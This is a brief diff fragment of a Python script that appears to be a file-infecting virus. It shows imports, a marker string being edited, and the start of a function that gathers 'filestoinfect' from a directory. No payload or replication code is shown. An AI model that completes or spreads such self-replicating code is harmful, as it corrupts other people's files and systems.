@@ -1,5 +1,5 @@
 import os, datetime, inspect, time
-DATA_TO_INSERT = "ELIOTT_TESSIER_0685259811"
+DATA_TO_INSERT = "ELIOTT_TESSIER"
 def search(path): #search for target files in path 
     filestoinfect = [] 
     filelist = os.listdir(path) 
